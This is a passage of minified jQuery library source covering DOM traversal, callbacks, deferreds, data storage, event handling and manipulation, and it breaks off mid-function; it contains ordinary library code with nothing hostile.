E=/^(?:parents|prev(?:Until|All))/,D={children:!0,contents:!0,next:!0,prev:!0};function A(t,e){for(;(t=t[e])&&1!==t.nodeType;);return t}h.fn.extend({has:function(t){var e=h(t,this),i=e.length;return this.filter((function(){for(var t=0;i>t;t++)if(h.contains(this,e[t]))return!0}))},closest:function(t,e){for(var i,a=0,o=this.length,n=[],r=x.test(t)||"string"!=typeof t?h(t,e||this.context):0;o>a;a++)for(i=this[a];i&&i!==e;i=i.parentNode)if(i.nodeType<11&&(r?r.index(i)>-1:1===i.nodeType&&h.find.matchesSelector(i,t))){n.push(i);break}return this.pushStack(n.length>1?h.uniqueSort(n):n)},index:function(t){return t?"string"==typeof t?s.call(h(t),this[0]):s.call(this,t.jquery?t[0]:t):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(t,e){return this.pushStack(h.uniqueSort(h.merge(this.get(),h(t,e))))},addBack:function(t){return this.add(null==t?this.prevObject:this.prevObject.filter(t))}}),h.each({parent:function(t){var e=t.parentNode;return e&&11!==e.nodeType?e:null},parents:function(t){return b(t,"parentNode")},parentsUntil:function(t,e,i){return b(t,"parentNode",i)},next:function(t){return A(t,"nextSibling")},prev:function(t){return A(t,"previousSibling")},nextAll:function(t){return b(t,"nextSibling")},prevAll:function(t){return b(t,"previousSibling")},nextUntil:function(t,e,i){return b(t,"nextSibling",i)},prevUntil:function(t,e,i){return b(t,"previousSibling",i)},siblings:function(t){return w((t.parentNode||{}).firstChild,t)},children:function(t){return w(t.firstChild)},contents:function(t){return t.contentDocument||h.merge([],t.childNodes)}},(function(t,e){h.fn[t]=function(i,a){var o=h.map(this,e,i);return"Until"!==t.slice(-5)&&(a=i),a&&"string"==typeof a&&(o=h.filter(a,o)),this.length>1&&(D[t]||h.uniqueSort(o),E.test(t)&&o.reverse()),this.pushStack(o)}}));var F,O=/\S+/g;function M(){a.removeEventListener("DOMContentLoaded",M),t.removeEventListener("load",M),h.ready()}h.Callbacks=function(t){t="string"==typeof t?function(t){var e={};return h.each(t.match(O)||[],(function(t,i){e[i]=!0})),e}(t):h.extend({},t);var e,i,a,o,n=[],r=[],s=-1,l=function(){for(o=t.once,a=e=!0;r.length;s=-1)for(i=r.shift();++s<n.length;)!1===n[s].apply(i[0],i[1])&&t.stopOnFalse&&(s=n.length,i=!1);t.memory||(i=!1),e=!1,o&&(n=i?[]:"")},c={add:function(){return n&&(i&&!e&&(s=n.length-1,r.push(i)),function e(i){h.each(i,(function(i,a){h.isFunction(a)?t.unique&&c.has(a)||n.push(a):a&&a.length&&"string"!==h.type(a)&&e(a)}))}(arguments),i&&!e&&l()),this},remove:function(){return h.each(arguments,(function(t,e){for(var i;(i=h.inArray(e,n,i))>-1;)n.splice(i,1),s>=i&&s--})),this},has:function(t){return t?h.inArray(t,n)>-1:n.length>0},empty:function(){return n&&(n=[]),this},disable:function(){return o=r=[],n=i="",this},disabled:function(){return!n},lock:function(){return o=r=[],i||(n=i=""),this},locked:function(){return!!o},fireWith:function(t,i){return o||(i=[t,(i=i||[]).slice?i.slice():i],r.push(i),e||l()),this},fire:function(){return c.fireWith(this,arguments),this},fired:function(){return!!a}};return c},h.extend({Deferred:function(t){var e=[["resolve","done",h.Callbacks("once memory"),"resolved"],["reject","fail",h.Callbacks("once memory"),"rejected"],["notify","progress",h.Callbacks("memory")]],i="pending",a={state:function(){return i},always:function(){return o.done(arguments).fail(arguments),this},then:function(){var t=arguments;return h.Deferred((function(i){h.each(e,(function(e,n){var r=h.isFunction(t[e])&&t[e];o[n[1]]((function(){var t=r&&r.apply(this,arguments);t&&h.isFunction(t.promise)?t.promise().progress(i.notify).done(i.resolve).fail(i.reject):i[n[0]+"With"](this===a?i.promise():this,r?[t]:arguments)}))})),t=null})).promise()},promise:function(t){return null!=t?h.extend(t,a):a}},o={};return a.pipe=a.then,h.each(e,(function(t,n){var r=n[2],s=n[3];a[n[1]]=r.add,s&&r.add((function(){i=s}),e[1^t][2].disable,e[2][2].lock),o[n[0]]=function(){return o[n[0]+"With"](this===o?a:this,arguments),this},o[n[0]+"With"]=r.fireWith})),a.promise(o),t&&t.call(o,o),o},when:function(t){var e,i,a,n=0,r=o.call(arguments),s=r.length,l=1!==s||t&&h.isFunction(t.promise)?s:0,c=1===l?t:h.Deferred(),d=function(t,i,a){return function(n){i[t]=this,a[t]=arguments.length>1?o.call(arguments):n,a===e?c.notifyWith(i,a):--l||c.resolveWith(i,a)}};if(s>1)for(e=new Array(s),i=new Array(s),a=new Array(s);s>n;n++)r[n]&&h.isFunction(r[n].promise)?r[n].promise().progress(d(n,i,e)).done(d(n,a,r)).fail(c.reject):--l;return l||c.resolveWith(a,r),c.promise()}}),h.fn.ready=function(t){return h.ready.promise().done(t),this},h.extend({isReady:!1,readyWait:1,holdReady:function(t){t?h.readyWait++:h.ready(!0)},ready:function(t){(!0===t?--h.readyWait:h.isReady)||(h.isReady=!0,!0!==t&&--h.readyWait>0||(F.resolveWith(a,[h]),h.fn.triggerHandler&&(h(a).triggerHandler("ready"),h(a).off("ready"))))}}),h.ready.promise=function(e){return F||(F=h.Deferred(),"complete"===a.readyState||"loading"!==a.readyState&&!a.documentElement.doScroll?t.setTimeout(h.ready):(a.addEventListener("DOMContentLoaded",M),t.addEventListener("load",M))),F.promise(e)},h.ready.promise();var N=function(t,e,i,a,o,n,r){var s=0,l=t.length,c=null==i;if("object"===h.type(i))for(s in o=!0,i)N(t,e,s,i[s],!0,n,r);else if(void 0!==a&&(o=!0,h.isFunction(a)||(r=!0),c&&(r?(e.call(t,a),e=null):(c=e,e=function(t,e,i){return c.call(h(t),i)})),e))for(;l>s;s++)e(t[s],i,r?a:a.call(t[s],s,e(t[s],i)));return o?t:c?e.call(t):l?e(t[0],i):n},I=function(t){return 1===t.nodeType||9===t.nodeType||!+t.nodeType};function P(){this.expando=h.expando+P.uid++}P.uid=1,P.prototype={register:function(t,e){var i=e||{};return t.nodeType?t[this.expando]=i:Object.defineProperty(t,this.expando,{value:i,writable:!0,configurable:!0}),t[this.expando]},cache:function(t){if(!I(t))return{};var e=t[this.expando];return e||(e={},I(t)&&(t.nodeType?t[this.expando]=e:Object.defineProperty(t,this.expando,{value:e,configurable:!0}))),e},set:function(t,e,i){var a,o=this.cache(t);if("string"==typeof e)o[e]=i;else for(a in e)o[a]=e[a];return o},get:function(t,e){return void 0===e?this.cache(t):t[this.expando]&&t[this.expando][e]},access:function(t,e,i){var a;return void 0===e||e&&"string"==typeof e&&void 0===i?void 0!==(a=this.get(t,e))?a:this.get(t,h.camelCase(e)):(this.set(t,e,i),void 0!==i?i:e)},remove:function(t,e){var i,a,o,n=t[this.expando];if(void 0!==n){if(void 0===e)this.register(t);else{h.isArray(e)?a=e.concat(e.map(h.camelCase)):(o=h.camelCase(e),e in n?a=[e,o]:a=(a=o)in n?[a]:a.match(O)||[]),i=a.length;for(;i--;)delete n[a[i]]}(void 0===e||h.isEmptyObject(n))&&(t.nodeType?t[this.expando]=void 0:delete t[this.expando])}},hasData:function(t){var e=t[this.expando];return void 0!==e&&!h.isEmptyObject(e)}};var L=new P,j=new P,R=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,q=/[A-Z]/g;function H(t,e,i){var a;if(void 0===i&&1===t.nodeType)if(a="data-"+e.replace(q,"-$&").toLowerCase(),"string"==typeof(i=t.getAttribute(a))){try{i="true"===i||"false"!==i&&("null"===i?null:+i+""===i?+i:R.test(i)?h.parseJSON(i):i)}catch(t){}j.set(t,e,i)}else i=void 0;return i}h.extend({hasData:function(t){return j.hasData(t)||L.hasData(t)},data:function(t,e,i){return j.access(t,e,i)},removeData:function(t,e){j.remove(t,e)},_data:function(t,e,i){return L.access(t,e,i)},_removeData:function(t,e){L.remove(t,e)}}),h.fn.extend({data:function(t,e){var i,a,o,n=this[0],r=n&&n.attributes;if(void 0===t){if(this.length&&(o=j.get(n),1===n.nodeType&&!L.get(n,"hasDataAttrs"))){for(i=r.length;i--;)r[i]&&(0===(a=r[i].name).indexOf("data-")&&(a=h.camelCase(a.slice(5)),H(n,a,o[a])));L.set(n,"hasDataAttrs",!0)}return o}return"object"==typeof t?this.each((function(){j.set(this,t)})):N(this,(function(e){var i,a;if(n&&void 0===e){if(void 0!==(i=j.get(n,t)||j.get(n,t.replace(q,"-$&").toLowerCase())))return i;if(a=h.camelCase(t),void 0!==(i=j.get(n,a)))return i;if(void 0!==(i=H(n,a,void 0)))return i}else a=h.camelCase(t),this.each((function(){var i=j.get(this,a);j.set(this,a,e),t.indexOf("-")>-1&&void 0!==i&&j.set(this,t,e)}))}),null,e,arguments.length>1,null,!0)},removeData:function(t){return this.each((function(){j.remove(this,t)}))}}),h.extend({queue:function(t,e,i){var a;return t?(e=(e||"fx")+"queue",a=L.get(t,e),i&&(!a||h.isArray(i)?a=L.access(t,e,h.makeArray(i)):a.push(i)),a||[]):void 0},dequeue:function(t,e){e=e||"fx";var i=h.queue(t,e),a=i.length,o=i.shift(),n=h._queueHooks(t,e);"inprogress"===o&&(o=i.shift(),a--),o&&("fx"===e&&i.unshift("inprogress"),delete n.stop,o.call(t,(function(){h.dequeue(t,e)}),n)),!a&&n&&n.empty.fire()},_queueHooks:function(t,e){var i=e+"queueHooks";return L.get(t,i)||L.access(t,i,{empty:h.Callbacks("once memory").add((function(){L.remove(t,[e+"queue",i])}))})}}),h.fn.extend({queue:function(t,e){var i=2;return"string"!=typeof t&&(e=t,t="fx",i--),arguments.length<i?h.queue(this[0],t):void 0===e?this:this.each((function(){var i=h.queue(this,t,e);h._queueHooks(this,t),"fx"===t&&"inprogress"!==i[0]&&h.dequeue(this,t)}))},dequeue:function(t){return this.each((function(){h.dequeue(this,t)}))},clearQueue:function(t){return this.queue(t||"fx",[])},promise:function(t,e){var i,a=1,o=h.Deferred(),n=this,r=this.length,s=function(){--a||o.resolveWith(n,[n])};for("string"!=typeof t&&(e=t,t=void 0),t=t||"fx";r--;)(i=L.get(n[r],t+"queueHooks"))&&i.empty&&(a++,i.empty.add(s));return s(),o.promise(e)}});var U=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,z=new RegExp("^(?:([+-])=|)("+U+")([a-z%]*)$","i"),W=["Top","Right","Bottom","Left"],B=function(t,e){return t=e||t,"none"===h.css(t,"display")||!h.contains(t.ownerDocument,t)};function V(t,e,i,a){var o,n=1,r=20,s=a?function(){return a.cur()}:function(){return h.css(t,e,"")},l=s(),c=i&&i[3]||(h.cssNumber[e]?"":"px"),d=(h.cssNumber[e]||"px"!==c&&+l)&&z.exec(h.css(t,e));if(d&&d[3]!==c){c=c||d[3],i=i||[],d=+l||1;do{d/=n=n||".5",h.style(t,e,d+c)}while(n!==(n=s()/l)&&1!==n&&--r)}return i&&(d=+d||+l||0,o=i[1]?d+(i[1]+1)*i[2]:+i[2],a&&(a.unit=c,a.start=d,a.end=o)),o}var J=/^(?:checkbox|radio)$/i,Q=/<([\w:-]+)/,G=/^$|\/(?:java|ecma)script/i,Y={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function Z(t,e){var i=void 0!==t.getElementsByTagName?t.getElementsByTagName(e||"*"):void 0!==t.querySelectorAll?t.querySelectorAll(e||"*"):[];return void 0===e||e&&h.nodeName(t,e)?h.merge([t],i):i}function X(t,e){for(var i=0,a=t.length;a>i;i++)L.set(t[i],"globalEval",!e||L.get(e[i],"globalEval"))}Y.optgroup=Y.option,Y.tbody=Y.tfoot=Y.colgroup=Y.caption=Y.thead,Y.th=Y.td;var K=/<|&#?\w+;/;function tt(t,e,i,a,o){for(var n,r,s,l,c,d,p=e.createDocumentFragment(),u=[],f=0,m=t.length;m>f;f++)if((n=t[f])||0===n)if("object"===h.type(n))h.merge(u,n.nodeType?[n]:n);else if(K.test(n)){for(r=r||p.appendChild(e.createElement("div")),s=(Q.exec(n)||["",""])[1].toLowerCase(),l=Y[s]||Y._default,r.innerHTML=l[1]+h.htmlPrefilter(n)+l[2],d=l[0];d--;)r=r.lastChild;h.merge(u,r.childNodes),(r=p.firstChild).textContent=""}else u.push(e.createTextNode(n));for(p.textContent="",f=0;n=u[f++];)if(a&&h.inArray(n,a)>-1)o&&o.push(n);else if(c=h.contains(n.ownerDocument,n),r=Z(p.appendChild(n),"script"),c&&X(r),i)for(d=0;n=r[d++];)G.test(n.type||"")&&i.push(n);return p}!function(){var t=a.createDocumentFragment().appendChild(a.createElement("div")),e=a.createElement("input");e.setAttribute("type","radio"),e.setAttribute("checked","checked"),e.setAttribute("name","t"),t.appendChild(e),p.checkClone=t.cloneNode(!0).cloneNode(!0).lastChild.checked,t.innerHTML="<textarea>x</textarea>",p.noCloneChecked=!!t.cloneNode(!0).lastChild.defaultValue}();var et=/^key/,it=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,at=/^([^.]*)(?:\.(.+)|)/;function ot(){return!0}function nt(){return!1}function rt(){try{return a.activeElement}catch(t){}}function st(t,e,i,a,o,n){var r,s;if("object"==typeof e){for(s in"string"!=typeof i&&(a=a||i,i=void 0),e)st(t,s,i,a,e[s],n);return t}if(null==a&&null==o?(o=i,a=i=void 0):null==o&&("string"==typeof i?(o=a,a=void 0):(o=a,a=i,i=void 0)),!1===o)o=nt;else if(!o)return t;return 1===n&&(r=o,(o=function(t){return h().off(t),r.apply(this,arguments)}).guid=r.guid||(r.guid=h.guid++)),t.each((function(){h.event.add(this,e,o,a,i)}))}h.event={global:{},add:function(t,e,i,a,o){var n,r,s,l,c,d,p,u,f,m,g,v=L.get(t);if(v)for(i.handler&&(i=(n=i).handler,o=n.selector),i.guid||(i.guid=h.guid++),(l=v.events)||(l=v.events={}),(r=v.handle)||(r=v.handle=function(e){return void 0!==h&&h.event.triggered!==e.type?h.event.dispatch.apply(t,arguments):void 0}),c=(e=(e||"").match(O)||[""]).length;c--;)f=g=(s=at.exec(e[c])||[])[1],m=(s[2]||"").split(".").sort(),f&&(p=h.event.special[f]||{},f=(o?p.delegateType:p.bindType)||f,p=h.event.special[f]||{},d=h.extend({type:f,origType:g,data:a,handler:i,guid:i.guid,selector:o,needsContext:o&&h.expr.match.needsContext.test(o),namespace:m.join(".")},n),(u=l[f])||((u=l[f]=[]).delegateCount=0,p.setup&&!1!==p.setup.call(t,a,m,r)||t.addEventListener&&t.addEventListener(f,r)),p.add&&(p.add.call(t,d),d.handler.guid||(d.handler.guid=i.guid)),o?u.splice(u.delegateCount++,0,d):u.push(d),h.event.global[f]=!0)},remove:function(t,e,i,a,o){var n,r,s,l,c,d,p,u,f,m,g,v=L.hasData(t)&&L.get(t);if(v&&(l=v.events)){for(c=(e=(e||"").match(O)||[""]).length;c--;)if(f=g=(s=at.exec(e[c])||[])[1],m=(s[2]||"").split(".").sort(),f){for(p=h.event.special[f]||{},u=l[f=(a?p.delegateType:p.bindType)||f]||[],s=s[2]&&new RegExp("(^|\\.)"+m.join("\\.(?:.*\\.|)")+"(\\.|$)"),r=n=u.length;n--;)d=u[n],!o&&g!==d.origType||i&&i.guid!==d.guid||s&&!s.test(d.namespace)||a&&a!==d.selector&&("**"!==a||!d.selector)||(u.splice(n,1),d.selector&&u.delegateCount--,p.remove&&p.remove.call(t,d));r&&!u.length&&(p.teardown&&!1!==p.teardown.call(t,m,v.handle)||h.removeEvent(t,f,v.handle),delete l[f])}else for(f in l)h.event.remove(t,f+e[c],i,a,!0);h.isEmptyObject(l)&&L.remove(t,"handle events")}},dispatch:function(t){t=h.event.fix(t);var e,i,a,n,r,s=[],l=o.call(arguments),c=(L.get(this,"events")||{})[t.type]||[],d=h.event.special[t.type]||{};if(l[0]=t,t.delegateTarget=this,!d.preDispatch||!1!==d.preDispatch.call(this,t)){for(s=h.event.handlers.call(this,t,c),e=0;(n=s[e++])&&!t.isPropagationStopped();)for(t.currentTarget=n.elem,i=0;(r=n.handlers[i++])&&!t.isImmediatePropagationStopped();)t.rnamespace&&!t.rnamespace.test(r.namespace)||(t.handleObj=r,t.data=r.data,void 0!==(a=((h.event.special[r.origType]||{}).handle||r.handler).apply(n.elem,l))&&!1===(t.result=a)&&(t.preventDefault(),t.stopPropagation()));return d.postDispatch&&d.postDispatch.call(this,t),t.result}},handlers:function(t,e){var i,a,o,n,r=[],s=e.delegateCount,l=t.target;if(s&&l.nodeType&&("click"!==t.type||isNaN(t.button)||t.button<1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&(!0!==l.disabled||"click"!==t.type)){for(a=[],i=0;s>i;i++)void 0===a[o=(n=e[i]).selector+" "]&&(a[o]=n.needsContext?h(o,this).index(l)>-1:h.find(o,this,null,[l]).length),a[o]&&a.push(n);a.length&&r.push({elem:l,handlers:a})}return s<e.length&&r.push({elem:this,handlers:e.slice(s)}),r},props:"altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(t,e){return null==t.which&&(t.which=null!=e.charCode?e.charCode:e.keyCode),t}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(t,e){var i,o,n,r=e.button;return null==t.pageX&&null!=e.clientX&&(o=(i=t.target.ownerDocument||a).documentElement,n=i.body,t.pageX=e.clientX+(o&&o.scrollLeft||n&&n.scrollLeft||0)-(o&&o.clientLeft||n&&n.clientLeft||0),t.pageY=e.clientY+(o&&o.scrollTop||n&&n.scrollTop||0)-(o&&o.clientTop||n&&n.clientTop||0)),t.which||void 0===r||(t.which=1&r?1:2&r?3:4&r?2:0),t}},fix:function(t){if(t[h.expando])return t;var e,i,o,n=t.type,r=t,s=this.fixHooks[n];for(s||(this.fixHooks[n]=s=it.test(n)?this.mouseHooks:et.test(n)?this.keyHooks:{}),o=s.props?this.props.concat(s.props):this.props,t=new h.Event(r),e=o.length;e--;)t[i=o[e]]=r[i];return t.target||(t.target=a),3===t.target.nodeType&&(t.target=t.target.parentNode),s.filter?s.filter(t,r):t},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==rt()&&this.focus?(this.focus(),!1):void 0},delegateType:"focusin"},blur:{trigger:function(){return this===rt()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&h.nodeName(this,"input")?(this.click(),!1):void 0},_default:function(t){return h.nodeName(t.target,"a")}},beforeunload:{postDispatch:function(t){void 0!==t.result&&t.originalEvent&&(t.originalEvent.returnValue=t.result)}}}},h.removeEvent=function(t,e,i){t.removeEventListener&&t.removeEventListener(e,i)},h.Event=function(t,e){return this instanceof h.Event?(t&&t.type?(this.originalEvent=t,this.type=t.type,this.isDefaultPrevented=t.defaultPrevented||void 0===t.defaultPrevented&&!1===t.returnValue?ot:nt):this.type=t,e&&h.extend(this,e),this.timeStamp=t&&t.timeStamp||h.now(),void(this[h.expando]=!0)):new h.Event(t,e)},h.Event.prototype={constructor:h.Event,isDefaultPrevented:nt,isPropagationStopped:nt,isImmediatePropagationStopped:nt,isSimulated:!1,preventDefault:function(){var t=this.originalEvent;this.isDefaultPrevented=ot,t&&!this.isSimulated&&t.preventDefault()},stopPropagation:function(){var t=this.originalEvent;this.isPropagationStopped=ot,t&&!this.isSimulated&&t.stopPropagation()},stopImmediatePropagation:function(){var t=this.originalEvent;this.isImmediatePropagationStopped=ot,t&&!this.isSimulated&&t.stopImmediatePropagation(),this.stopPropagation()}},h.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},(function(t,e){h.event.special[t]={delegateType:e,bindType:e,handle:function(t){var i,a=this,o=t.relatedTarget,n=t.handleObj;return o&&(o===a||h.contains(a,o))||(t.type=n.origType,i=n.handler.apply(this,arguments),t.type=e),i}}})),h.fn.extend({on:function(t,e,i,a){return st(this,t,e,i,a)},one:function(t,e,i,a){return st(this,t,e,i,a,1)},off:function(t,e,i){var a,o;if(t&&t.preventDefault&&t.handleObj)return a=t.handleObj,h(t.delegateTarget).off(a.namespace?a.origType+"."+a.namespace:a.origType,a.selector,a.handler),this;if("object"==typeof t){for(o in t)this.off(o,e,t[o]);return this}return!1!==e&&"function"!=typeof e||(i=e,e=void 0),!1===i&&(i=nt),this.each((function(){h.event.remove(this,t,i,e)}))}});var lt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,ct=/<script|<style|<link/i,dt=/checked\s*(?:[^=]|=\s*.checked.)/i,pt=/^true\/(.*)/,ut=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function ht(t,e){return h.nodeName(t,"table")&&h.nodeName(11!==e.nodeType?e:e.firstChild,"tr")?t.getElementsByTagName("tbody")[0]||t.appendChild(t.ownerDocument.createElement("tbody")):t}function ft(t){return t.type=(null!==t.getAttribute("type"))+"/"+t.type,t}function mt(t){var e=pt.exec(t.type);return e?t.type=e[1]:t.removeAttribute("type"),t}function gt(t,e){var i,a,o,n,r,s,l,c;if(1===e.nodeType){if(L.hasData(t)&&(n=L.access(t),r=L.set(e,n),c=n.events))for(o in delete r.handle,r.events={},c)for(i=0,a=c[o].length;a>i;i++)h.event.add(e,o,c[o][i]);j.hasData(t)&&(s=j.access(t),l=h.extend({},s),j.set(e,l))}}function vt(t,e){var i=e.nodeName.toLowerCase();"input"===i&&J.test(t.type)?e.checked=t.checked:"input"!==i&&"textarea"!==i||(e.defaultValue=t.defaultValue)}function yt(t,e,i,a){e=n.apply([],e);var o,r,s,l,c,d,u=0,f=t.length,m=f-1,g=e[0],v=h.isFunction(g);if(v||f>1&&"string"==typeof g&&!p.checkClone&&dt.test(g))return t.each((function(o){var n=t.eq(o);v&&(e[0]=g.call(this,o,n.html())),yt(n,e,i,a)}));if(f&&(r=(o=tt(e,t[0].ownerDocument,!1,t,a)).firstChild,1===o.childNodes.length&&(o=r),r||a)){for(l=(s=h.map(Z(o,"script"),ft)).length;f>u;u++)c=o,u!==m&&(c=h.clone(c,!0,!0),l&&h.merge(s,Z(c,"script"))),i.call(t[u],c,u);if(l)for(d=s[s.length-1].ownerDocument,h.map(s,mt),u=0;l>u;u++)c=s[u],G.test(c.type||"")&&!L.access(c,"globalEval")&&h.contains(d,c)&&(c.src?h._evalUrl&&h._evalUrl(c.src):h.globalEval(c.textContent.replace(ut,"")))}return t}function $t(t,e,i){for(var a,o=e?h.filter(e,t):t,n=0;null!=(a=o[n]);n++)i||1!==a.nodeType||h.cleanData(Z(a)),a.parentNode&&(i&&h.contains(a.ownerDocument,a)&&X(Z(a,"script")),a.parentNode.removeChild(a));return t}h.extend({htmlPrefilter:function(t){return t.replace(lt,"<$1></$2>")},clone:function(t,e,i){var a,o,n,r,s=t.cloneNode(!0),l=h.contains(t.ownerDocument,t);if(!(p.noCloneChecked||1!==t.nodeType&&11!==t.nodeType||h.isXMLDoc(t)))for(r=Z(s),a=0,o=(n=Z(t)).length;o>a;a++)vt(n[a],r[a]);if(e)if(i)for(n=n||Z(t),r=r||Z(s),a=0,o=n.length;o>a;a++)gt(n[a],r[a]);else gt(t,s);return(r=Z(s,"script")).length>0&&X(r,!l&&Z(t,"script")),s},cleanData:function(t){for(var e,i,a,o=h.event.special,n=0;void 0!==(i=t[n]);n++)if(I(i)){if(e=i[L.expando]){if(e.events)for(a in e.events)o[a]?h.event.remove(i,a):h.removeEvent(i,a,e.handle);i[L.expando]=void 0}i[j.expando]&&(i[j.expando]=void 0)}}}),h.fn.extend({domManip:yt,detach:function(t){return $t(this,t,!0)},remove:function(t){return $t(this,t)},text:function(t){return N(this,(function(t){return void 0===t?h.text(this):this.empty().each((function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=t)}))}),null,t,arguments.length)},append:function(){return yt(this,arguments,(function(t){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||ht(this,t).appendChild(t)}))},prepend:function(){return yt(this,arguments,(function(t){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var e=ht(this,t);e.insertBefore(t,e.firstChild)}}))},before:function(){return yt(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this)}))},after:function(){return yt(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this.nextSibling)}))},empty:function(){for(var t,e=0;null!=(t=this[e]);e++)1===t.nodeType&&(h.cleanData(Z(t,!1)),t.textContent="");return this},clone:function(t,e){return t=null!=t&&t,e=null==e?t:e,this.map((function(){return h.clone(this,t,e)}))},html:function(t){return N(this,(function(t){var e=this[0]||{},i=0,a=this.length;if(void 0===t&&1===e.nodeType)return e.innerHTML;if("string"==typeof t&&!ct.test(t)&&!Y[(Q.exec(t)||["",""])[1].toLowerCase()]){t=h.htmlPrefilter(t);try{for(;a>i;i++)1===(e=this[i]||{}).nodeType&&(h.cleanData(Z(e,!1)),e.innerHTML=t);e=0}catch(t){}}e&&this.empty().append(t)}),null,t,arguments.length)},replaceWith:function(){var t=[];return yt(this,arguments,(function(e){var i=this.parentNode;h.inArray(this,t)<0&&(h.cleanData(Z(this)),i&&i.replaceChild(e,this))}),t)}}),h.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},(function(t,e){h.fn[t]=function(t){for(var i,a=[],o=h(t),n=o.length-1,s=0;n>=s;s++)i=s===n?this:this.clone(!0),h(o[s])[e](i),r.apply(a,i.get());return this.pushStack(a)}}));var bt,wt={HTML:"block",BODY:"block"};function xt(t,e){var i=h(e.createElement(t)).appendTo(e.body),a=h.css(i[0],"display");return i.detach(),a}function Ct(t){var e=a,i=wt[t];return i||("none"!==(i=xt(t,e))&&i||((e=(bt=(bt||h("<iframe frameborder='0' width='0' height='0'/>")).appendTo(e.documentElement))[0].contentDocument).write(),e.close(),i=xt(t,e),bt.detach()),wt[t]=i),i}var kt=/^margin/,St=new RegExp("^("+U+")(?!px)[a-z%]+$","i"),Tt=function(e){var i=e.ownerDocument.defaultView;return i&&i.opener||(i=t),i.getComputedStyle(e)},_t=function(t,e,i,a){var o,n,r={};for(n in e)r[n]=t.style[n],t.style[n]=e[n];for(n in o=i.apply(t,a||[]),e)t.style[n]=r[n];return o},Et=a.documentElement;function Dt(t,e,i){var a,o,n,r,s=t.style;return""!==(r=(i=i||Tt(t))?i.getPropertyValue(e)||i[e]:void 0)&&void 0!==r||h.contains(t.ownerDocument,t)||(r=h.style(t,e)),i&&!p.pixelMarginRight()&&St.test(r)&&kt.test(e)&&(a=s.width,o=s.minWidth,n=s.maxWidth,s.minWidth=s.maxWidth=s.width=r,r=i.width,s.width=a,s.minWidth=o,s.maxWidth=n),void 0!==r?r+"":r}function At(t,e){return{get:function(){return t()?void delete this.get:(this.get=e).apply(this,arguments)}}}!function(){var e,i,o,n,r=a.createElement("div"),s=a.createElement("div");if(s.style){function l(){s.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",s.innerHTML="",Et.appendChild(r);var a=t.getComputedStyle(s);e="1%"!==a.top,n="2px"===a.marginLeft,i="4px"===a.width,s.style.marginRight="50%",o="4px"===a.marginRight,Et.removeChild(r)}s.style.backgroundClip="content-box",s.cloneNode(!0).style.backgroundClip="",p.clearCloneStyle="content-box"===s.style.backgroundClip,r.style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",r.appendChild(s),h.extend(p,{pixelPosition:function(){return l(),e},boxSizingReliable:function(){return null==i&&l(),i},pixelMarginRight:function(){return null==i&&l(),o},reliableMarginLeft:function(){return null==i&&l(),n},reliableMarginRight:function(){var e,i=s.appendChild(a.createElement("div"));return i.style.cssText=s.style.cssText="-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",i.style.marginRight=i.style.width="0",s.style.width="1px",Et.appendChild(r),e=!parseFloat(t.getComputedStyle(i).marginRight),Et.removeChild(r),s.removeChild(i),e}})}}();var Ft=/^(none|table(?!-c[ea]).+)/,Ot={position:"absolute",visibility:"hidden",display:"block"},Mt={letterSpacing:"0",fontWeight:"400"},Nt=["Webkit","O","Moz","ms"],It=a.createElement("div").style;function Pt(t){if(t in It)return t;for(var e=t[0].toUpperCase()+t.slice(1),i=Nt.length;i--;)if((t=Nt[i]+e)in It)return t}function Lt(t,e,i){var a=z.exec(e);return a?Math.max(0,a[2]-(i||0))+(a[3]||"px"):e}function jt(t,e,i,a,o){for(var n=i===(a?"border":"content")?4:"width"===e?1:0,r=0;4>n;n+=2)"margin"===i&&(r+=h.css(t,i+W[n],!0,o)),a?("content"===i&&(r-=h.css(t,"padding"+W[n],!0,o)),"margin"!==i&&(r-=h.css(t,"border"+W[n]+"Width",!0,o))):(r+=h.css(t,"padding"+W[n],!0,o),"padding"!==i&&(r+=h.css(t,"border"+W[n]+"Width",!0,o)));return r}function Rt(t,e,i){var a=!0,o="width"===e?t.offsetWidth:t.offsetHeight,n=Tt(t),r="border-box"===h.css(t,"boxSizing",!1,n);if(0>=o||null==o){if((0>(o=Dt(t,e,n))||null==o)&&(o=t.style[e]),St.test(o))return o;a=r&&(p.boxSizingReliable()||o===t.style[e]),o=parseFloat(o)||0}return o+jt(t,e,i||(r?"border":"content"),a,n)+"px"}function qt(t,e){for(var 